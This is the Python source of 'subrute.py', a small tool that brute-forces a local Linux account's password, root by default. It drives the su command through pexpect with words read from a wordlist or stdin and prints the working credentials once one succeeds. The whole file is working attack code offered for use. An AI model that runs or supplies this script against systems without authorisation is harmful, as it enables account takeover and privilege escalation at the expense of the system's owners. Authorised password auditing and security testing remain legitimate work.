#!/usr/bin/env python

"""
subrute.py -- by Daniel Roberson @dmfroberson

Simple brute forcer for su program. Very slow. Very terrible.

Takes input from a wordlist or stdin, so you can use a tool like
davenavarrosgoatee.py to pipe in words from the filesystem.

This takes about 2 seconds per try on most of the Linux systems
I've tested this on so far.
"""

import os
import sys
import pwd
import argparse
import pexpect


def try_word(user, password):
    """try_word() -- Attempt to su - user

    Args:
        user (str)     - Username
        password (str) - Password to try

    Returns:
        bool: True for successful login, False otherwise

    """

    child = pexpect.spawn("/bin/su - %s" % user, timeout=10)

    child.expect("Password:")
    child.sendline(password)

    i = child.expect(["su: Authentication failure", "[\$%%#]"])

    if i == 0:
        return False

    child.sendline("exit")
    return True


def user_exists(user):
    """user_exists() -- Check if a local user exists

    Args:
        user (str) - Username to check

    Returns:
        pwent struct if the user exists
        None if the user does not exist

    """

    try:
        pwent = pwd.getpwnam(user)
    except:
        return None

    return pwent


def is_valid_shell(shell):
    """is_valid_shell() -- Checks if a shell exists in /etc/shells

    Args:
        shell (str) - path to shell

    Returns:
        bool: True if the shell exists in /etc/shells, otherwise False

    """

    # Most Lineux will let you login without a shell set!
    if shell == '':
        return True

    for line in open("/etc/shells"):
        if not line.startswith("#"):
            if line.rstrip() == shell:
                return True

    return False


def main():
    """Main function"""

    print "[+] subrute.py -- by Daniel Roberson @dmfroberson"
    print

    # Parse CLI arguments
    description = "example: ./subrute.py -u <username> -w <wordlist>"
    parser = argparse.ArgumentParser(description=description)
    parser.add_argument("-u",
                        "--user",
                        default="root",
                        help="local user to attack")
    parser.add_argument("-w",
                        "--wordlist",
                        default="",
                        required=True,
                        help="dictionary file. - for stdin")
    args = parser.parse_args()

    # Check if user exists
    pwent = user_exists(args.user)
    if pwent is None:
        print "[-] User does not exist: %s" % args.user
        print "[-] Exiting."
        return os.EX_NOUSER

    # Check if user has valid shell
    if is_valid_shell(pwent.pw_shell) is False:
        print "[-] User %s has a non-login shell: %s" % \
            (args.user, pwent.pw_shell)
        print "[-] Exiting."
        return os.EX_USAGE

  # Check if dictionary is readable
    try:
        if args.wordlist == "-":
            print "[+] Using stdin for input"
            dictionary = sys.stdin
        else:
            dictionary = open(args.wordlist, "r")
    except IOError as error:
        print "[-] Unable to open %s for reading: %s" % \
            (args.wordlist, os.strerror(error.errno))
        print "[-] Exiting"
        return os.EX_NOINPUT

    print "[+] Attempting to brute force %s user.." % args.user
    print "[+] Press Control-C to stop the violence."

    while True:
        word = dictionary.readline().rstrip()

        if not word:
            break

        if try_word(args.user, word):
            print "[+] Success! Valid credentials: %s:%s" % (args.user, word)
            return os.EX_OK

    print "[-] No matches found."
    print "[-] Embrace your fear as you are enveloped by an eternal nightmare!"
    return os.EX_USAGE


if __name__ == "__main__":
    exit(main())
